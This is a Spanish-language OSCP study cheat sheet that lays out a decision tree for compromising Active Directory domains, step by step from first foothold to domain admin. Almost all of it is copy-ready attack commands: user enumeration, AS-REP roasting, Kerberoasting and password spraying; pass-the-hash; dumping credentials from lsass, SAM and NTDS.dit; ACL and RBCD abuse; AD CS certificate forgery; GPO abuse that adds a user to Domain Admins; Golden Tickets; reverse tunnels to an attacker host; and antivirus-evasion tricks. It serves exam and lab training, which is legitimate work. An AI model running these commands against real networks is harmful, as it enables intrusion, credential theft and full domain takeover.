# Active Directory — Árbol de decisión (IF → vectores)

> **Cómo usar este archivo.** AD en el OSCP no se "hackea", se **recorre**: cada botín (un usuario, una credencial, un hash, una shell, un privilegio) te mueve de casilla y cada casilla tiene una **lista fija de ataques**. Cuando te trabes, la pregunta nunca es *"¿qué exploit me falta?"* sino **"¿en qué posición estoy y qué ataques tiene esa posición?"**. El 90% de los atascos es un paso omitido de tu propia lista, no una técnica exótica.
>
> Este documento es el **árbol de decisión** (el "qué hacer cuando veo X"). Para el detalle largo de cada herramienta, flags y casos raros, salta a [`6b-AD-Referencia-Detallada.md`](6b-AD-Referencia-Detallada.md). Para "cómo pienso" en prosa, [`MetodologiaAD.md`](MetodologiaAD.md). Casos reales resueltos paso a paso en [`writeups/`](writeups/).

---

## Variables (define esto UNA vez al empezar)

```bash
export IP=10.10.10.10           # host objetivo actual
export DC=10.10.10.10           # IP del Domain Controller
export DOMAIN=corp.local        # dominio (FQDN)
export DCHOST=dc01.corp.local   # hostname del DC (Kerberos lo exige, NO acepta IP)
export USER=jdoe
export PASS='Verano2025!'
export HASH=aad3b435b51404eeaad3b435b51404ee:NTHASH   # LM:NT (o deja :NT)
```

```bash
# Kerberos trabaja con NOMBRES y es estricto con el RELOJ. Antes de tocar nada de Kerberos:
echo "$DC $DCHOST $DOMAIN dc01" | sudo tee -a /etc/hosts     # mapea el DC
sudo ntpdate $DC            # o: sudo rdate -n $DC   (evita KRB_AP_ERR_SKEW)
```

> `nxc` = NetExec (sucesor de CrackMapExec; si tu caja aún trae `crackmapexec`, los flags son idénticos).

---

## IF (A) — Árbol por PUERTOS: "veo este puerto → significa esto → pruebo esto"

Lo primero tras el `nmap -p-`. Un DC se delata por su **combinación** de puertos.

```
SI veo 88 + 389 + 445 (+ 5985) juntos        → ES un Domain Controller
                                              → saca el FQDN real y mételo a /etc/hosts YA
                                              → vas a la POSICIÓN 1
```

```bash
nmap -p- --min-rate 2000 -Pn $IP -oN nmap-full.txt
nmap -p 53,88,135,139,389,445,464,636,3268,3389,5985,9389 -sCV $IP -oN nmap-ad.txt
# nmap te revela el dominio y el FQDN del DC en la salida de LDAP/SMB/RDP. NUNCA lo adivines.
```

| SI el puerto está abierto | Significa | ENTONCES los vectores son |
|---|---|---|
| **88** Kerberos | Es AD. Casi nunca está cerrado. | `kerbrute userenum` (lista usuarios sin logins fallidos), AS-REP roast, luego Kerberoast con cred |
| **135 / 139 / 445** SMB | Enum + ejecución | null session, `--shares`, `--rid-brute`, GPP en SYSVOL; con cred: psexec/wmiexec, PtH |
| **389 / 3268** LDAP / Global Catalog | Enum de objetos y ACLs | bind anónimo, `description=*`, BloodHound, `-M laps`, `-M get-desc-users` |
| **636 / 3269** LDAPS | LDAP sobre TLS | igual que LDAP cuando el DC exige firma/cifrado (`ldapsearch -H ldaps://`) |
| **464** kpasswd | Cambio de password Kerberos | reset de password tras ACL (`ForceChangePassword`) |
| **5985 / 5986** WinRM | Shell remota | `evil-winrm` (user ha de estar en *Remote Management Users* o ser admin) |
| **3389** RDP | GUI / NLA | `xfreerdp`; truco SeRestore→Utilman con `/sec:nla:off` (ver P6) |
| **593 / 9389** RPC-HTTP / ADWS | AD activo | confirma AD; ADWS para `Get-ADxxx` nativo |
| **1433** MSSQL | Servicio con contexto | `xp_cmdshell`, impersonation `EXEC AS`, hash NTLM del servicio → **POSICIÓN 8** |
| **80 / 443** Web | Única puerta sin cred | nombres de empleados → `username-anarchy`; creds en la app → **prueba en SMB Y en la web** (Feast); upload → RCE (Access); SSRF → NTLM theft (Heist) |
| **El DC NO responde desde Kali** | No es posición nueva: es **red** | monta un **túnel** (ligolo/chisel) por un host que ya controles. Ver *Transversal*. |

---

## IF (B) — Árbol por POSICIÓN: "tengo esto → estos son los vectores"

El mapa completo. Identifica tu posición; cada botín te **reubica** (consigues un hash → P4; una shell → P5; un edge de BloodHound → P7). Ataca **toda la lista** de tu posición, en orden, antes de buscar algo nuevo.

```
P1  Solo IP / red ........... objetivo: conseguir una LISTA de usuarios
P2  Lista de usuarios ....... AS-REP roast → spraying → user=pass
P3  1 credencial de dominio . BloodHound → Kerberoast → shares/LDAP → ¿admin en algún host?
P4  1 hash NTLM ............. Pass-the-Hash, Overpass-the-Hash, barrido de dónde es admin
P5  Shell de usuario ........ privesc local: SeImpersonate, DPAPI, historial PS, winPEAS
P6  Admin local / SYSTEM .... SAM/LSA, lsass, LAPS, SeBackup/SeRestore, ntds.dit
P7  ACL / edge sobre objeto . resetear pass, AddMember, Shadow Creds, WriteDacl→DCSync, RBCD
P8  Servicio con contexto ... MSSQL→xp_cmdshell, AD CS (ESC1-8), GPO abuse, app con creds
P9  Privilegio de dominio ... DCSync, PtH al DC, Golden/Silver Ticket
```

---

### POSICIÓN 1 — Solo IP, sin usuarios ni credenciales

**Señal:** identificaste el DC. No tienes ni un usuario. **Objetivo único: una LISTA de usuarios válidos.** Casi todo lo demás depende de tenerla.

```bash
# SMB sin cred: null session y guest. Si funciona, a veces lista shares y usuarios.
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u 'guest' -p '' --rid-brute 10000      # usuarios por RID
smbclient -L //$IP/ -N

# RPC anónimo + enum4linux-ng (saca usuarios, grupos y política de lockout)
rpcclient -U '' -N $IP        # dentro: enumdomusers / enumdomgroups / getdompwinfo
enum4linux-ng -A $IP

# LDAP bind anónimo — mira SIEMPRE el campo description (ahí dejan passwords)
ldapsearch -x -H ldap://$IP -s base namingcontexts
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description

# Kerberos (88) casi nunca está cerrado: kerbrute NO genera logins fallidos (no bloquea)
kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# genera candidatos desde nombres reales de la web/PDF: username-anarchy -i nombres.txt
```

> 🔴 **Nunca leas el volcado LDAP a ojo — fíltralo siempre** (lección Hutch: `fmcsorley` tenía la pass en `description` escondida entre cientos de líneas).
> ```bash
> ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" > ldap_dump.txt
> grep -i -E "descr|pass|pwd|comment|info|key|secret" ldap_dump.txt
> ```

**→ Conseguí:** lista de usuarios → **P2** · una credencial (web/share) → **P3** · el DC no responde → **túnel**.

---

### POSICIÓN 2 — Tengo lista de usuarios, ninguna contraseña

**Objetivo:** convertir un nombre en credencial o hash crackeable. Orden: AS-REP (gratis) → spraying → user=pass.

```bash
# AS-REP Roasting — cuentas sin preauth. No necesita cred. Pruébalo SIEMPRE.
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Password spraying — 1 pass plausible contra TODOS. Mira el lockout primero (getdompwinfo).
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Otono2025!'   # el más silencioso
nxc smb $DC -u users.txt -p 'Otono2025!' --continue-on-success

# user = pass (sorprendentemente común en labs/examen — Monteverde)
nxc smb $DC -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

> 🔴 **Lockout:** si bloqueas la cuenta objetivo pierdes horas. Spraying de 1 sola pass por ventana y usa `kerbrute` (no deja logins de red).

**→ Conseguí:** credencial (user:pass) → **P3** · hash AS-REP crackeado → **P3** con esa cred.

---

### POSICIÓN 3 — Tengo 1 credencial de dominio (la posición más rica)

**Orden:** valida dónde sirve → **BloodHound** (el mapa) → Kerberoast → caza más creds en shares/LDAP → ¿admin en algún host? **No pospongas BloodHound.**

```bash
# 1) ¿Dónde vale y dónde soy admin local? (busca (Pwn3d!))
nxc smb 10.10.10.0/24 -u $USER -p $PASS      # barre la subred
nxc winrm 10.10.10.0/24 -u $USER -p $PASS

# 2) BloodHound: el camino más corto a Domain Admin
bloodhound-python -d $DOMAIN -u $USER -p $PASS -ns $DC -c all --zip
sudo bloodhound-ce up
#   → marca tu user como Owned, mira "Outbound Object Control" y "Shortest paths to DA"

# 3) Kerberoasting: cuentas de servicio (SVC_*, MSSQL*) con SPN. Pass débil → muy rentable.
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
#   nativo desde Windows: setspn -T $DOMAIN -Q */*   +   Rubeus.exe kerberoast /nowrap

# 4) Caza más credenciales: GPP en SYSVOL, descripciones, shares
nxc smb $DC -u $USER -p $PASS -M gpp_password        # cpassword (clave pública conocida)
nxc ldap $DC -u $USER -p $PASS -M get-desc-users     # passwords en description
nxc smb $IP -u $USER -p $PASS -M spider_plus         # spider de todos los shares
```

> 🔴 **Credencial válida sin shell NO es callejón sin salida** (Hutch): una cred que valida en SMB/LDAP pero no en WinRM **sigue sirviendo para enumerar ACLs**. La pregunta no es *"¿dónde logueo?"* sino **"¿qué permisos tiene este user sobre otros objetos?"** → P7. Checklist cuando tengo 1 cred y no sé avanzar:
> - `nxc` smb/winrm/ldap (dónde autentica, dónde es admin)
> - `-M laps` (¿puedo leer `ms-Mcs-AdmPwd` de algún equipo?) · `--gmsa` (¿leo la pass de una gMSA?)
> - BloodHound → Outbound Object Control
> - Kerberoast / AS-REP · shares y descripciones

**→ Conseguí:** cred de otra cuenta → repites P3 · hash NTLM → **P4** · admin local (Pwn3d!) → entra, **P6** · un edge → **P7**.

---

### POSICIÓN 4 — Tengo un hash NTLM, no la contraseña

Un hash NTLM vale casi lo mismo que la pass: te autenticas directo (NTLM/Kerberos).

```bash
# ¿Dónde es admin este hash? (un Administrator local suele estar reutilizado)
nxc smb 10.10.10.0/24 -u Administrator -H $HASH --local-auth    # cuenta LOCAL
nxc smb 10.10.10.0/24 -u $USER -H $HASH                         # cuenta de DOMINIO

# Pass-the-Hash: entra con el hash
evil-winrm -i $IP -u $USER -H NTHASH
impacket-psexec $DOMAIN/$USER@$IP -hashes $HASH      # shell SYSTEM
impacket-wmiexec $DOMAIN/$USER@$IP -hashes $HASH     # más sigiloso

# Overpass-the-Hash: hash NTLM → TGT Kerberos (si NTLM está restringido y Kerberos no)
impacket-getTGT $DOMAIN/$USER -hashes $HASH -dc-ip $DC
export KRB5CCNAME=$USER.ccache
nxc smb $DCHOST -u $USER -k --use-kcache

# Intenta crackearlo (la pass en claro suele reutilizarse en más sitios)
hashcat -m 1000 nt.hash /usr/share/wordlists/rockyou.txt
```

> 🔴 **PtH funciona con psexec pero NO con evil-winrm** = normal: WinRM con hash exige que el user tenga acceso WinRM. Usa el hash por SMB (wmiexec/psexec) o crackéalo.
> 🔴 **Hash-spray** (ResourceD): si sacaste muchos hashes de un `ntds.dit` de backup, muchos estarán **caducados**. No adivines: `nxc smb $IP -u users.txt -H hashes.txt --continue-on-success | grep '\[+\]'`. Vacío = sin conexión; `[-] LOGON_FAILURE` = caducado; `[+]` = válido.

**→ Conseguí:** shell → **P5** (o **P6** si entraste como admin/SYSTEM) · la pass en claro → **P3**.

---

### POSICIÓN 5 — Tengo shell de USUARIO en una máquina

**Objetivo:** subir a admin local/SYSTEM y cazar credenciales de dominio que vivan ahí. Orden: privilegios del token → secretos guardados → enumeración automática.

```bash
# Lo PRIMERO: un solo comando puede ahorrarte toda la enum
whoami /priv        # ¿SeImpersonate? ¿SeBackup? ¿SeRestore? → ya tienes el camino
whoami /groups
ipconfig /all       # ¿otras subredes? → pivoting

# SeImpersonatePrivilege → SYSTEM (típico en cuentas de servicio/IIS/MSSQL)
.\PrintSpoofer64.exe -i -c cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"      # si PrintSpoofer no va (Windows moderno)

# DPAPI — credenciales guardadas del usuario (Credential Manager, navegadores, RDP)
nxc smb $IP -u $USER -p $PASS --dpapi

# Historial de PowerShell — passwords tecleadas en claro (de los sitios más fructíferos)
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
findstr /si password *.txt *.xml *.config *.ps1 2>nul

# Enumeración automática (lee tú la salida; rojo/amarillo = candidatas, no verdades)
.\winPEASx64.exe
```

> 🔴 **No todas las carpetas "estándar" son escribibles** (Access): `C:\Windows\Temp` puede estar denegado para una cuenta de servicio; usa `C:\ProgramData`. **Verifica la escritura con un archivo de prueba ANTES de subir el exploit**: `echo test > C:\ProgramData\poc.txt && dir C:\ProgramData\poc.txt`.
> 🔴 **`certutil` con error WinHTTP 12004** suele ser **permisos de escritura**, no red: prueba `curl.exe` o `Invoke-WebRequest` para ver el error real.

**→ Conseguí:** SYSTEM/admin local → **P6** · cred de dominio nueva (DPAPI/historial) → **P3**.

---

### POSICIÓN 6 — Admin local / SYSTEM en una máquina

Admin local casi nunca es el final: es **munición** para el siguiente salto. Extrae todos los secretos y reutilízalos.

```bash
# SAM/SYSTEM/LSA — hashes locales (el Administrator local suele reutilizarse en todo el dominio)
reg save HKLM\SAM C:\tmp\SAM & reg save HKLM\SYSTEM C:\tmp\SYSTEM & reg save HKLM\SECURITY C:\tmp\SECURITY
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
nxc smb $IP -u Administrator -H $HASH --local-auth --sam --lsa

# lsass — creds en memoria de sesiones activas (¡incluido un admin logueado ahí!)
.\mimikatz.exe      # privilege::debug ; sekurlsa::logonpasswords ; sekurlsa::ekeys
# o vuelca y parsea offline (evita AV):  rundll32 comsvcs.dll MiniDump <PID> lsass.dmp full  →  pypykatz

# LAPS — pass del admin local de otros equipos en un atributo LDAP (si tu cuenta lo lee)
nxc ldap $DC -u $USER -p $PASS -M laps
nxc smb $IP -u Administrator -p 'PassLAPS' --local-auth

# SeBackupPrivilege → NTDS.dit (en un DC = TODOS los hashes del dominio)
robocopy /B C:\Windows\NTDS C:\tmp NTDS.dit      # si está en uso: shadow copy con diskshadow
reg save HKLM\SYSTEM C:\tmp\SYSTEM
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

> 🔴 **LSA secrets `_SC_<servicio>`** (Feast): guardan la **pass en claro** de la cuenta que corre ese servicio. Si corre como cuenta de dominio privilegiada → game over (`nxc --lsa` / `secretsdump`).
> 🔴 **gMSA** (Heist): si tu user está en `PrincipalsAllowedToReadPassword`, lees el hash NT de la cuenta `svc_xxx$`: `nxc ldap $IP -u $USER -p $PASS --gmsa` → PtH.
> 🔴 **SeBackup/SeRestore: el privilegio Enabled NO basta** (Heist) — el kernel solo lo consulta si el fichero se abre en **modo backup** (`FILE_FLAG_BACKUP_SEMANTICS`). `copy`/`Copy-Item` normal → *Access Denied*; `robocopy /B` exige backup **Y** restore a la vez. Con **solo SeRestore**: abre el fichero con `CreateFile` + flag `0x02000000` desde PowerShell (activar privilegio y escribir han de ser el **mismo proceso**) y sobrescribe `Utilman.exe` con `cmd.exe` → RDP `/sec:nla:off` → botón Accesibilidad → consola SYSTEM. Detalle completo en [`writeups/heist-writeup.md`](writeups/heist-writeup.md).

**→ Conseguí:** hash del Administrator local → **P4** (reutiliza por la red) · cred/hash de dominio → **P3/P4** · NTDS.dit → **P9**.

---

### POSICIÓN 7 — Tengo un permiso / ACL (edge) sobre un objeto

BloodHound te muestra que controlas un derecho sobre un objeto. **Cada edge es un ataque concreto.** `bloodyAD` ejecuta la mayoría desde Linux en una línea.

| Edge en BloodHound | Vector |
|---|---|
| **GenericAll / GenericWrite** sobre un USUARIO | Shadow Credentials · resetear pass · targeted Kerberoast (set SPN) |
| **GenericAll** sobre un GRUPO | `AddMember` (añádete) |
| **ForceChangePassword** | resetear la pass sin saber la actual |
| **WriteDacl / WriteOwner** sobre el DOMINIO | auto-concederte DCSync |
| **AddKeyCredentialLink** | Shadow Credentials (certipy/pywhisker) |
| **GenericAll** sobre un EQUIPO | RBCD · Shadow Creds sobre la cuenta de máquina |
| **GpoEdit / WriteGPLink** | GPO abuse → **P8** |
| **ReadLAPSPassword / ReadGMSAPassword** | leer `ms-Mcs-AdmPwd` / pass de gMSA → **P6** |

```bash
# Resetear pass (GenericAll / ForceChangePassword) — infalible en lab, ruidoso
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC set password victima 'NuevaPass123!'

# Añadirte a un grupo (GenericAll / AddMember)
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add groupMember "GRUPO_OBJETIVO" $USER

# Shadow Credentials (GenericWrite/AddKeyCredentialLink) — sin tocar su pass, te da TGT + hash NT
certipy shadow auto -u $USER@$DOMAIN -p $PASS -account victima -dc-ip $DC

# WriteDacl sobre el dominio → auto-DCSync
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add dcsync $USER
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt      # → P9

# RBCD (GenericWrite sobre un EQUIPO) — ResourceD: crear máquina → delegar → S4U → impersonar admin
impacket-addcomputer $DOMAIN/$USER -hashes :NTHASH -computer-name 'FAKE01$' -computer-pass 'Fake1234!' -dc-ip $DC
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write $DOMAIN/$USER -hashes :NTHASH -dc-ip $DC
impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator -dc-ip $DC $DOMAIN/'FAKE01$':'Fake1234!'
export KRB5CCNAME=Administrator@cifs_target...ccache
impacket-psexec -k -no-pass administrator@target.$DOMAIN
```

> 🔴 **Dirección de las aristas** (Feast): en BloodHound, *Inbound* Object Control = quién me controla a mí (trivial, los admins controlan a todos). Lo útil es **Outbound Object Control** = a quién controlo yo.
> 🔴 **`SeMachineAccountPrivilege` + escritura sobre el DC = RBCD** (ResourceD). El `!` en bash rompe los comandos de `bloodyAD`: `set +H` o comillas simples.
> 🔴 `net rpc`/`ldapmodify` pueden fallar **sin mostrar error**: verifica siempre (`net rpc group members`). Alternativa: `bloodyAD`.

**→ Conseguí:** cred/hash de la víctima → **P3/P4** · DCSync o membresía en DA → **P9**.

---

### POSICIÓN 8 — Tengo acceso a un servicio con contexto

A veces el camino no pasa por una cuenta sino por un servicio mal configurado.

```bash
# MSSQL — xp_cmdshell / impersonation / captura de hash
impacket-mssqlclient $DOMAIN/$USER:$PASS@$IP -windows-auth
#   enable_xp_cmdshell ; xp_cmdshell whoami ; EXEC AS LOGIN = 'sa'
nxc mssql $IP -u $USER -p $PASS -M mssql_priv

# AD CS — certipy (ESC1 es el más común). Pides un cert a nombre de un admin y te autenticas.
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CORP-CA' -template 'VulnTemplate' -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC      # → TGT + hash NT del admin
#   ESC1 subject arbitrario · ESC4 control sobre plantilla · ESC6 flag en la CA · ESC8 relay NTLM · ESC16 ver Referencia

# GPO abuse (GpoEdit sobre una GPO que aplica al DC = SYSTEM) — Vault
python3 pygpoabuse.py $DOMAIN/$USER:'$PASS' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' \
  -command 'net group "Domain Admins" '$USER' /add /domain' -taskname 'Update'
gpupdate /force    # luego RECONÉCTATE: el token solo recoge el grupo nuevo en un login nuevo

# App web / servicio con creds en su config → vuelve a P3
findstr /si "password connectionString" *.config *.json *.xml 2>nul
```

> 🔴 **Credencial de app ≠ credencial de dominio** (Feast): si unas creds fallan por SMB/WinRM, **pruébalas en cada web** (logins que validan contra BD local). · Upload que filtra `.php`: sube un `.htaccess` con `AddType application/x-httpd-php .evil` y luego el webshell `.evil` (Access). · Apache/PHP en Windows corre como **SYSTEM**.

**→ Conseguí:** shell por xp_cmdshell → **P5** (suele traer SeImpersonate) · cert/hash de admin de dominio → **P9** · cred reutilizable → **P3**.

---

### POSICIÓN 9 — Tengo privilegio de alto nivel en el dominio

**Señal:** eres DA, tienes derechos de replicación, o el hash de `krbtgt`. Prácticamente ganaste.

```bash
# DCSync — replica todos los hashes como si fueras un DC
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user administrator   # rápido, para el screenshot
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc                      # todo el dominio
nxc smb $DC -u $USER -p $PASS --ntds

# Entrar al DC como Administrator (PtH) y recoger la flag
evil-winrm -i $DC -u Administrator -H NTHASH
type C:\Users\Administrator\Desktop\proof.txt

# Golden Ticket (persistencia con krbtgt) — solo si lo pide el objetivo
impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-... -domain $DOMAIN administrator

# Silver Ticket (TGS forjado para un servicio concreto, sin hablar con el DC)
impacket-ticketer -nthash SERVICE_NTHASH -domain-sid S-1-5-21-... -domain $DOMAIN -spn cifs/$DCHOST administrator
```

> 🔴 **Administrator lee CUALQUIER carpeta.** Si la flag está en `C:\Users\OtroUser\Desktop`, no necesitas "ser" ese user, solo navegar ahí como Administrator.
> 🔴 **Documenta en el instante**: `whoami /all` + `ipconfig` + la flag en la **misma captura**, en **cada** host de la cadena. La parte de AD vale 40 pts y es **todo-o-nada**.

---

## Transversal — Movimiento lateral, pivoting, post-explotación del DC

### ¿Tengo cred/hash válido en un host, cómo entro? (prueba en orden: WinRM → wmiexec → psexec)

| Puerto / protocolo | Herramienta | Notas |
|---|---|---|
| 5985 WinRM | `evil-winrm` | La mejor shell. User en *Remote Management Users* o admin. |
| 445 SMB (servicio) | `psexec` | Shell SYSTEM, crea un servicio (ruidoso). |
| 445 SMB (WMI) | `wmiexec` | Semi-interactiva, sin servicio. Más sigiloso. |
| 445 SMB (task) | `atexec` / `smbexec` | Vía tarea programada. |
| 135 DCOM | `dcomexec` | Cuando psexec/wmiexec fallan. |
| 3389 RDP | `xfreerdp` | GUI. PtH con Restricted Admin. |

```bash
evil-winrm -i $IP -u $USER -H NTHASH
impacket-wmiexec $DOMAIN/$USER:$PASS@$IP
xfreerdp /v:$IP /u:$USER /p:$PASS /cert:ignore +clipboard /dynamic-resolution
# comando en masa en todos los hosts donde eres admin:
nxc smb 10.10.10.0/24 -u $USER -p $PASS -x "whoami"
```

### El DC o una 2ª subred no se alcanzan desde Kali → túnel

```bash
# ligolo-ng (el más cómodo: interfaz tun, SIN proxychains) — el favorito del examen
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601                 # Kali
./agent -connect 10.10.14.1:11601 -ignore-cert         # host comprometido
sudo ip route add 172.16.1.0/24 dev ligolo             # enruta la subred interna → start

# chisel (SOCKS sin SSH) — cuando ligolo no conecta
./chisel server -p 9001 --reverse                      # Kali
./chisel client 10.10.14.1:9001 R:socks                # objetivo → proxychains ...

# SSH port forwarding (el más limpio si tienes cred SSH)
ssh -D 1080 user@$IP          # SOCKS
```

### Post-explotación del DC (dueño del dominio)

```bash
nxc smb $DC -u Administrator -H $HASH --ntds        # vuelca toda la NTDS (krbtgt incluido)
evil-winrm -i $DC -u Administrator -H NTHASH
  Get-ChildItem C:\Users\*\Desktop\*.txt -Force     # recoge TODAS las flags de la cadena
```

> En el OSCP la persistencia rara vez puntúa: prioriza flags y documentación.

---

## SOS — Cuando algo no funciona (síntoma → causa). El 90% es reloj, nombres o el secreto equivocado.

| Síntoma | Causa → arreglo |
|---|---|
| `KRB_AP_ERR_SKEW` / "clock skew too great" | Tu reloj difiere del DC. `sudo ntpdate $DC`. Vuelve a pedir el ticket. |
| Kerberos falla con la IP | Kerberos usa **nombres**, no IPs. Usa `$DCHOST` y mapea el DC en `/etc/hosts`. |
| `KDC_ERR_PREAUTH_FAILED` | Pass/hash incorrectos o cuenta inexistente. Revalida con `nxc`. |
| `WinRMAuthorizationError` / 401 en evil-winrm | Cred válida pero el user no puede WinRM. Necesita *Remote Management Users* o ser admin. Usa wmiexec/psexec. |
| PtH va con psexec pero no con evil-winrm | Normal: WinRM con hash exige acceso WinRM. Usa el hash por SMB o crackéalo. |
| GetNPUsers/GetUserSPNs no devuelve nada | No hay cuentas sin preauth / sin SPN, o reloj/nombre mal. Confirma con cred válida y `-request`. |
| El hash no crackea ni sirve por PtH | ¿Es Kerberos (AS-REP/TGS, modos 18200/13100), no NTLM? Esos **solo se crackean**, no se pasan. |
| `ldapsearch: Operations error` / bind falla | El DC exige LDAP autenticado/firmado. Usa `-D "$USER@$DOMAIN" -w "$PASS"` o LDAPS (636). |
| `secretsdump: STATUS_LOGON_FAILURE` | Cuenta local: falta `--local-auth` / dominio = hostname. DCSync: falta privilegio de replicación. |
| Caracteres raros / "UTF-16" al pegar un hash/pass | Archivo en UTF-16 (reg/PowerShell). `iconv -f UTF-16 -t UTF-8 in > out` o `dos2unix`. |
| `bloodhound-python` falla por DNS | Añade `-ns $DC` y `-dc $DCHOST` y revisa `/etc/hosts`. |
| No alcanzo el DC / una 2ª subred | No es posición nueva: es red. Monta un **túnel** (ligolo/chisel). |
| Spraying bloquea cuentas | Te pasaste del lockout. `getdompwinfo`, 1 intento por ventana, usa `kerbrute`. |
| El binario (mimikatz/winPEAS) lo come el AV | Vuelca lsass a archivo y parsea en Kali (pypykatz), o `reg save`+secretsdump. Living off the land. |
| `nxc` devuelve vacío | Sin conexión (VPN caída / máquina parada / IP mal), **no** es "hash caducado" (eso es `[-] LOGON_FAILURE`). |
| Responder "no captura" | Solo imprime cada hash único 1 vez: mira `/usr/share/responder/logs/`. Y arranca con `sudo -I tun0`. |
| Herramienta Python rota con traceback de `cryptography`/`aioquic` | Conflicto de dependencias. Venv aislado o `uv` (ver [`writeups/kali-python-viejo-uv.md`](writeups/kali-python-viejo-uv.md)). |

---

## Gestión del examen (parte de AD)

- **40 de 100 pts**, funciona como **cadena** (entrada → intermedio → DC) y es **todo-o-nada** por cadena en el esquema clásico.
- Lee el **objetivo del set** primero: te dicen el host de entrada y a veces una cred inicial. No escanees el DC directo si tu entrada es otra máquina.
- Pregúntate **"¿en qué posición estoy?"** antes de buscar un exploit nuevo. Repasa la lista completa de tu posición: el atasco casi siempre es un paso omitido.
- **Documenta a medida que avanzas**, no al final. Cada comando + salida, con screenshot. `proof.txt`/`local.txt` con `whoami` + `ipconfig` visibles.
- Si te atascas **30+ min**: vuelve arriba y verifica que hiciste toda la lista (¿BloodHound? ¿descripciones? ¿GPP? ¿SeImpersonate? ¿el reloj sincronizado?).
- El DC casi siempre cae por: **cadena de creds reutilizadas**, **Kerberoast** de una cuenta de servicio débil, un **edge** de BloodHound, **AD CS**, o **DCSync** una vez tienes replicación. Rara vez por un 0-day.

> Mentalidad: AD no se "hackea", se **recorre**. Mantén un documento vivo con *"posición actual → qué tengo → qué me falta probar"* y lo demás sale solo.
